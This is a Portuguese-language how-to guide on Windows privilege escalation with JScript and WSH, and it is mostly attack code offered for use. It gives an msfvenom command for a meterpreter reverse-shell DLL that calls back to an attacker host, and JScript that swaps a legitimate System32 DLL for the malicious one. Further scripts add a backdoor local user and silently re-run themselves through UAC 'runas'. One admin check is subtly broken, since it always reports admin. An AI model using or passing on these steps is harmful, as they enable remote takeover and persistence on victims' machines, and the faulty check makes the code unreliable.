# ELEVAÇÃO DE PRIVILÉGIO COM JSCRIPT

__Utiliza o método <code>ShellExecute</code> do objeto <code>WScript.Shell</code> para executar um comando no Windows. O parâmetro <code>"runas"</code> indica que o comando deve ser executado com privilégios de administrador.__
<br/>

# Passos Para Realizar DLL Hijacking

### 1. Criar a DLL Maliciosa
Primeiro, você precisa criar uma DLL que contém o código que você deseja executar. Você pode usar ferramentas como msfvenom para gerar um payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f dll -o malicious.dll
```

### 2. Colocar a DLL no Diretório Correto
Encontre um diretório que é verificado pelo sistema ou por uma aplicação que executa com privilégios elevados. Um exemplo comum é o diretório System32.

```javascript
var WshShell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// Caminho para a DLL maliciosa
var maliciousDllPath = "C:\\Windows\\System32\\malicious.dll";

// Caminho para a DLL legítima
var legitimateDllPath = "C:\\Windows\\System32\\legitimate.dll";

// Renomear a DLL legítima
fso.MoveFile(legitimateDllPath, legitimateDllPath + ".bak");

// Copiar a DLL maliciosa para o diretório legítimo
fso.CopyFile("C:\\path\\to\\malicious.dll", maliciousDllPath);
```
<br/>

### 3. Esperar que a Aplicação Carregue a DLL
Agora, você precisa esperar que a aplicação ou o sistema carregue a DLL maliciosa. Isso pode ocorrer automaticamente se a aplicação for iniciada ou se o sistema for reiniciado.

<br/>
<hr/>

## Exemplo de Script WSH para Elevação de Privilégios

```javascript
var WshShell = new ActiveXObject("WScript.Shell");
var command = "cmd.exe /c net user newUser password /add";
WshShell.Run(command, 1, true);
```

<br/>

## Exemplo de verificar se o usuário tem permissões de administrador e, se não tiver, solicitar a elevação.

```javascript
function isAdmin() {
    var shell = new ActiveXObject("WScript.Shell");
    try {
        // Tenta executar um comando que requer permissões de administrador
        var result = shell.Run("net session", 0, true);
        return true; // Se o comando for bem-sucedido, o usuário é administrador
    } catch (e) {
        return false; // Se o comando falhar, o usuário não é administrador
    }
}

function runAsAdmin() {
    var shell = new ActiveXObject("WScript.Shell");
    // Reexecuta o script como administrador
    shell.ShellExecute(WScript.FullName, "", "", "runas", 0); // 1 para mostrar a janela / 0 para não mostrar a janela
}

function sayHello() {
    WScript.Echo("Hello World");
}

// Verifica se o usuário é administrador
if (isAdmin()) {
    sayHello(); // Executa a função se for administrador
} else {
    runAsAdmin(); // Solicita elevação se não for administrador
}

```

<br/>

## Exemplo completo que incorpora essa linha para solicitar elevação de privilégios antes de executar um comando específico. 
Neste caso, o script tentará reexecutar a si mesmo com permissões de administrador:

```javascript
function runAsAdmin() {
    try {
        var shell = new ActiveXObject("WScript.Shell");

        // Executa o script atual com permissões de administrador
        shell.ShellExecute(WScript.FullName, "", "", "runas", 0);
    } catch (e) {
        WScript.Echo("Erro ao solicitar elevação de privilégio: " + e.message);
    }
}

// Verifica se o script já está sendo executado como administrador
function isUserAdmin() {
    try {
        var shell = new ActiveXObject("WScript.Shell");
        var network = new ActiveXObject("WScript.Network");

        // Obtém o nome do usuário atual
        var username = network.UserName;

        // Verifica se o usuário atual é parte do grupo Administradores
        var command = "net localgroup Administradores";
        var exec = shell.Exec(command);
        var output = "";

        // Lê a saída do comando
        while (!exec.StdOut.AtEndOfStream) {
            output += exec.StdOut.ReadLine() + "\n";
        }

        // Verifica se o nome de usuário está na lista de administradores
        return output.indexOf(username) !== -1;
    } catch (e) {
        WScript.Echo("Erro ao verificar permissões: " + e.message);
        return false; // Retorna falso em caso de erro
    }
}

// Chama a função para verificar permissões
if (!isUserAdmin()) {
    WScript.Echo("Solicitando permissões de administrador...");
    runAsAdmin();
} else {
    WScript.Echo("O script está sendo executado como administrador.");
    // Coloque aqui o código que deve ser executado com permissões de administrador
}
```
